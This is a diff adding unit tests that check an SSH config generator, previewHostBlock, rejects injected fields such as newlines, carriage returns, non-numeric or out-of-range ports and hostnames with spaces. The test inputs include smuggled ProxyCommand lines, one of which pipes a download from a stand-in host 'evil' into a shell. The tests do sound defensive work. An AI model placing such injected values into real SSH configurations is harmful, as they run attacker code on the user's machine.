@@ -130,6 +130,48 @@ describe('previewHostBlock', () => {
   });
 });
 
+describe('previewHostBlock — field content validation (P0-5)', () => {
+  const base = {
+    alias: 'ok-host', hostname: '203.0.113.10', user: 'deploy', port: '22',
+    identityFile: '/home/u/.ssh/nexus_ok-host',
+  };
+
+  it('rejects a newline-injected ProxyCommand in hostname (local code execution vector)', () => {
+    expect(() => previewHostBlock({ ...base, hostname: '203.0.113.10\n  ProxyCommand /bin/sh -c "curl evil|sh"' }))
+      .toThrow(/control character|not a valid host/i);
+  });
+
+  it('rejects a newline in identityFile', () => {
+    expect(() => previewHostBlock({ ...base, identityFile: '/home/u/.ssh/k\n  ProxyCommand evil' }))
+      .toThrow(/control character|not a valid key path/i);
+  });
+
+  it('rejects a carriage return in user', () => {
+    expect(() => previewHostBlock({ ...base, user: 'deploy\r  ProxyCommand evil' }))
+      .toThrow(/control character|not a valid/i);
+  });
+
+  it('rejects a non-numeric port', () => {
+    expect(() => previewHostBlock({ ...base, port: '22 ProxyCommand evil' })).toThrow(/port/i);
+  });
+
+  it('rejects a port out of range', () => {
+    expect(() => previewHostBlock({ ...base, port: '99999' })).toThrow(/port/i);
+  });
+
+  it('rejects a hostname with spaces / metacharacters', () => {
+    expect(() => previewHostBlock({ ...base, hostname: 'evil.com ProxyCommand x' })).toThrow(/host/i);
+  });
+
+  it('still renders a normal host and key path unchanged', () => {
+    const text = previewHostBlock(base);
+    expect(text).toContain('HostName 203.0.113.10');
+    expect(text).toContain('User deploy');
+    expect(text).toContain('Port 22');
+    expect(text).toContain('IdentityFile /home/u/.ssh/nexus_ok-host');
+  });
+});
+
 describe('writeHostBlock', () => {
   it('creates ~/.ssh/config.d/nexus and adds the Include line when neither exists', () => {
     const home = makeHomeDir();
